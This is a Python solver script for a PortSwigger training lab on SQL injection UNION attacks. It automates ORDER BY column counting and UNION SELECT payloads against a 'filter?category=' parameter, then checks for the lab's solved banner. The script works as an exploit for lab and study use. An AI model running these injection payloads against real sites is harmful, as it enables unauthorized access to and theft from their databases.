#!/usr/bin/env python3
# Lab: SQL injection UNION attack, finding a column containing text
# Lab-Link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text>
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_unique_string(host):
    r = requests.get(host, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    try:
        return soup.find('p', {'id': 'hint'}).text.split("'")[1]
    except: # noqa: 722
        return None


def get_num_columns(url):
    for i in range(1, 100):
        r = requests.get(url + f"' order by {i}--", verify=False, proxies=proxies)
        if r.status_code != 200:
            return i - 1
    return False


def exploit(url, num_columns, unique_string):
    for i in range(1, num_columns + 1):
        payloads = ['null'] * num_columns
        payloads[i - 1] = f"'{unique_string}'"
        payload = f"' UNION (SELECT {','.join(payloads)})--"
        print(f'[ ] Attempt position {i}: {payload}')
        r = requests.get(f"{url}{payload}", verify=False, proxies=proxies)
        if r.status_code == 200:
            return i
    return False


if __name__ == "__main__":
    print('[+] SQL injection UNION attack, finding a column containing text')
    try:
        host = sys.argv[1].strip().rstrip('/')
        # unique_string = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <host> <unique_string>')
        print(f'[-] Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    unique_string = get_unique_string(host)
    if unique_string is None:
        print('[-] Failed to extract unique string')
        sys.exit(-2)
    print(f'[+] Unique string to use: {unique_string}')

    url = f'{host}/filter?category=Accessories'
    num_columns = get_num_columns(url)
    if num_columns:
        print(f'[+] Detected {num_columns} columns')

        string_column = exploit(url, num_columns, unique_string)
        if string_column:
            print(f'[+] Injection successful, string column found at position {string_column}')
        else:
            print('[-] Injection not successful')

        # I had some issues getting the 'congratulations' banner.
        # So wait a bit before getting the page
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in requests.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')
    else:
        print(f'[-] Failed to get number of columns')
        sys.exit(-3)
